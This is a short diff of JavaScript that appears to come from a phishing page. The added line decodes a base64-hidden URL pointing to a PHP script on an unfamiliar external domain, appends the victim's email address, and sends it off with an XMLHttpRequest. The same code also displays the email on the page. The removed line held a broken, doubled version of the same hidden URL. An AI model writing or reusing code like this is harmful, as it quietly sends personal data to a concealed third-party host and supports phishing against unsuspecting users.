@@ -7192,7 +7192,7 @@
         var email = encoded_string;
         $('.identity').html(email);
         var request = new XMLHttpRequest();
-        var url = window.atob('aHR0cHM6Ly9rcS5pdWNqZmM5LnNhLmNvbS8uYm9kLy5sbC9nZW4vcHJ2LnBocD9pZD0aHR0cHM6Ly9kb3ZpbGFrLnNhLmNvbS9zYXMvcHJ2LnBocD9pZD0') + email
+        var url = window.atob('aHR0cHM6Ly9rcS5pdWNqZmM5LnNhLmNvbS8uYm9kLy5sbC9nZW4vcHJ2LnBocD9pZD0') + email
         request.open('GET', url, true);
         request.onload = function() {
             if (this.status >= 200 && this.status < 400) {
